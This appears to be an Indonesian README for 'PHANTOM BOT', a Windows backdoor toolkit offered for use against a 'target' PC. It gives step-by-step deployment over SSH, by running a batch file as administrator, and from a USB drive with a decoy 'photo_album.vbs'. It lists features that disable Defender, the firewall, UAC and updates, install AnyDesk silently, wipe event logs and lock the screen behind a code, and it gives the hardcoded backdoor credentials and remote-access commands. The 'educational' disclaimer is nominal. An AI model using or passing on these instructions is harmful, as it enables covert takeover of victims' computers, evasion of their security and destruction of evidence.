# ☠️ PHANTOM BOT - "Ghost in the Machine"

**Hidden admin account + Auto-persistence + Defender/Firewall/UAC/Update killer + Remote Desktop + AnyDesk backdoor + 3-layer auto-recovery + Lock Screen + Black Screen + Bluescreen**

> *"You can't see me, but I'm always watching you."* 👻🔥💀📡

---

## 📌 DAFTAR ISI

1. [Deskripsi](#-deskripsi)
2. [Fitur Lengkap](#-fitur-lengkap)
3. [Kode Unlock](#-kode-unlock-lock-screen)
4. [Cara Pakai di Windows](#-cara-pakai-di-windows)
5. [Cara Pakai di Linux](#-cara-pakai-di-linux)
6. [Cara Pakai di Termux (Android)](#-cara-pakai-di-termux-android)
7. [Cara Pakai di Flashdisk](#-cara-pakai-di-flashdisk)
8. [Cara Aktifkan SSH di Windows](#-cara-aktifkan-ssh-di-windows-target-untuk-termux)
9. [Perbandingan Metode](#-perbandingan-metode)
10. [Cara Akses PC Target](#-cara-akses-pc-target)
11. [Disclaimer](#-disclaimer)

---

## 📌 DESKRIPSI

PHANTOM BOT adalah alat persistent yang dirancang untuk menguasai sistem Windows secara diam-diam. Menggabungkan backdoor, persistence, lock screen, dan bypass keamanan dalam satu paket. Begitu masuk, dia tinggal selamanya.

**⚠️ DISCLAIMER:** Tools ini untuk tujuan edukasi. Penyalahgunaan sepenuhnya tanggung jawab pengguna.

---

## 🔧 FITUR LENGKAP

| No | Fitur | Keterangan |
|----|-------|------------|
| 1 | **Hidden Admin Account** | Membuat user `AdminIzumy` yang tidak terlihat di layar login |
| 2 | **Backup Hidden Admin** | User `HiddenAdmin` sebagai cadangan |
| 3 | **Windows Defender Killer** | Menghapus file Defender & menonaktifkan service-nya secara permanen |
| 4 | **Firewall Killer** | Mematikan Windows Firewall (semua profile) |
| 5 | **UAC Killer** | Menonaktifkan User Account Control (tidak ada peringatan admin) |
| 6 | **Windows Update Killer** | Menonaktifkan Windows Update agar tidak ada patch keamanan |
| 7 | **Remote Desktop (RDP)** | Mengaktifkan Remote Desktop untuk akses jarak jauh |
| 8 | **AnyDesk Install** | Menginstal AnyDesk secara diam-diam + auto-start |
| 9 | **Persistence (3 Layers)** | Auto-recreate account, Defender mati, Firewall mati setiap booting |
| 10 | **Black Screen** | Mematikan monitor (layar hitam) |
| 11 | **Bluescreen (BSOD)** | Trigger Blue Screen of Death |
| 12 | **Lock Screen** | Fullscreen hitam yang meminta kode untuk membuka |
| 13 | **Anti-Forensic** | Menghapus event log (System, Security, Application) |
| 14 | **Auto-Restart** | PC restart otomatis setelah eksekusi |

---

## 🔑 KODE UNLOCK LOCK SCREEN

| Kode Default | Bisa Diganti? |
|--------------|---------------|
| `IZUMY2050` | ✅ **YA**, cari `$correctCode = 'IZUMY2050'` di script `.bat` |

---

## 🪟 CARA PAKAI DI WINDOWS

### 📦 Persiapan
| Yang Dibutuhkan | Keterangan |
|-----------------|------------|
| **PC Windows** | Target atau PC sendiri (buat testing) |
| **Admin Rights** | Harus bisa "Run as administrator" |
| **Notepad** | Buat nulis script |

### 🚀 Langkah-langkah

| Step | Perintah |
|------|----------|
| 1 | Buka **Notepad** |
| 2 | Copy script `bot.bat` (ada di repository) |
| 3 | Paste ke Notepad |
| 4 | **File → Save As** |
| 5 | Nama file: `bot.bat` |
| 6 | Save as type: **All Files (\*.\*)** |
| 7 | Encoding: **ANSI** |
| 8 | Klik **Save** |
| 9 | **Klik kanan** `bot.bat` → **Run as administrator** |
| 10 | Klik **Yes** di UAC prompt |
| 11 | Tunggu proses selesai (muncul "MISSION COMPLETE") |
| 12 | PC akan **restart otomatis** dalam 3 detik |

### ✅ Hasil
- PC target menjadi **BOT**
- Lock screen aktif dengan kode `IZUMY2050`
- Backdoor account `AdminIzumy` (hidden)

---

## 🐧 CARA PAKAI DI LINUX

### 📦 Persiapan
| Yang Dibutuhkan | Keterangan |
|-----------------|------------|
| **PC Linux** | Ubuntu/Debian/Kali |
| **Koneksi WiFi** | Satu jaringan dengan target |
| **SSH di target** | Harus aktif |
| **Username & Password** | Admin target |

### 🚀 Langkah-langkah

| Step | Perintah di Terminal |
|------|----------------------|
| 1 | Buka **Terminal** |
| 2 | `sudo apt update && sudo apt upgrade -y` |
| 3 | `sudo apt install sshpass openssh-client -y` |
| 4 | `nano auto_deploy.sh` |
| 5 | Copy script `auto_deploy.sh` (ada di repository) |
| 6 | Paste di nano → `Ctrl+X` → `Y` → `Enter` |
| 7 | `chmod +x auto_deploy.sh` |
| 8 | `./auto_deploy.sh` |
| 9 | Masukkan **IP Target**, **Username**, **Password** |
| 10 | Tunggu proses selesai |

### ✅ Hasil
- PC target menjadi **BOT** dari jarak jauh
- Lock screen aktif

---

## 📱 CARA PAKAI DI TERMUX (ANDROID)

### 📦 Persiapan
| Yang Dibutuhkan | Keterangan |
|-----------------|------------|
| **HP Android** | Minimal Android 7 |
| **Aplikasi Termux** | Download dari F-Droid |
| **Koneksi WiFi** | HP & PC target satu jaringan |
| **SSH di target** | Harus aktif |
| **Username & Password** | Admin target |

### 🚀 Langkah-langkah

| Step | Perintah di Termux |
|------|---------------------|
| 1 | Buka **Termux** |
| 2 | `pkg update && pkg upgrade -y` |
| 3 | `pkg install sshpass openssh nano -y` |
| 4 | `nano auto_deploy.sh` |
| 5 | Copy script `auto_deploy.sh` (ada di repository) |
| 6 | Paste di nano (tap & hold → Paste) |
| 7 | `Ctrl+X` → `Y` → `Enter` |
| 8 | `chmod +x auto_deploy.sh` |
| 9 | `./auto_deploy.sh` |
| 10 | Masukkan **IP Target**, **Username**, **Password** |
| 11 | Tunggu proses selesai |

### ⚠️ Tips Termux
| Masalah | Solusi |
|---------|--------|
| Keyboard gak muncul | Tap layar |
| Paste gak bisa | Tap & hold → Paste |
| Storage error | `termux-setup-storage` |
| Package not found | `pkg update` dulu |

### ✅ Hasil
- PC target menjadi **BOT** dari HP
- Lock screen aktif

---

## 💾 CARA PAKAI DI FLASHDISK

### 📦 Persiapan
| Yang Dibutuhkan | Keterangan |
|-----------------|------------|
| **Flashdisk** | Kapasitas bebas, minimal 1 MB |
| **PC Windows** | Buat nyiapin file |
| **Notepad** | Buat nulis script |

### 🚀 Langkah-langkah

| Step | Perintah |
|------|----------|
| 1 | Colok flashdisk ke PC |
| 2 | Copy `bot.bat` ke flashdisk |
| 3 | Buka Notepad |
| 4 | Copy script `photo_album.vbs` (ada di repository) |
| 5 | Save As → `photo_album.vbs` → All Files |
| 6 | Copy `photo_album.vbs` ke flashdisk |
| 7 | Isi flashdisk: `bot.bat` + `photo_album.vbs` |
| 8 | Colok flashdisk ke **PC target** |
| 9 | Target **double-click** `photo_album.vbs` |
| 10 | **BOT AKTIF!** |

### ✅ Hasil
- PC target menjadi **BOT** tanpa perlu klik kanan admin
- Lock screen aktif

---

## 🔧 CARA AKTIFKAN SSH DI WINDOWS TARGET (UNTUK TERMUX)

| Step | Perintah di PowerShell (Admin) |
|------|--------------------------------|
| 1 | Buka **PowerShell sebagai Administrator** |
| 2 | `Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0` |
| 3 | `Start-Service sshd` |
| 4 | `Set-Service -Name sshd -StartupType 'Automatic'` |
| 5 | `New-NetFirewallRule -Name sshd -DisplayName 'OpenSSH Server' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22` |
| 6 | Cek IP target: `ipconfig` |

---

## 📊 PERBANDINGAN METODE

| Aspek | Windows (.bat) | Flashdisk (.vbs) | Linux/Termux (.sh) |
|-------|----------------|------------------|-------------------|
| **Platform** | Windows | Windows + USB | Linux / Android |
| **Akses Fisik** | ✅ Wajib | ✅ Wajib (colok USB) | ❌ Bisa remote |
| **Target Klik** | ✅ Klik kanan admin | ✅ Double-click .vbs | ❌ Otomatis |
| **SSH Aktif** | ❌ Gak perlu | ❌ Gak perlu | ✅ Wajib |
| **Internet** | ❌ Gak perlu | ❌ Gak perlu | ✅ Butuh 1 WiFi |
| **Deteksi AV** | 🟡 Medium | 🟢 Low | 🔴 High |
| **Keahlian Target** | Admin | Klik file | - |

---

## 🔑 CARA AKSES PC TARGET

### Opsi 1: Remote Desktop (RDP)
| Parameter | Nilai |
|-----------|-------|
| **IP** | `192.168.x.x` (IP target) |
| **Username** | `AdminIzumy` |
| **Password** | `P@ssw0rd123!` |

```cmd
mstsc /v 192.168.1.100
```

## Opsi 2: AnyDesk

| Parameter  | Nilai | 
|------------|-------|
| Address    | Cek di AnyDesk target (auto-installed) | 
| Password   | Tidak perlu (silent install) | 

## Opsi 3: Command Line (Network)
```cmd
net use \\192.168.x.x\IPC$ /user:AdminIzumy P@ssw0rd123!
```
## 🛠️ TROUBLESHOOTING

| Masalah  | Solusi | 
|------------|-------|
| UAC muncul    | Script udah matiin UAC, tapi kalo masih muncul, klik Yes | 
| Defender gak mati   | Jalanin sebagai Administrator | 
|SSH connection refused   | SSH belum aktif di target, ikuti cara di atas | 
| File .vbs gak jalan   | Pastikan double-click, bukan right-click | 
| Lock screen gak muncul   | Cek kode `$correctCode`, pastikan gak kehapus | 
| AnyDesk gak install   | Koneksi internet target harus aktif | 

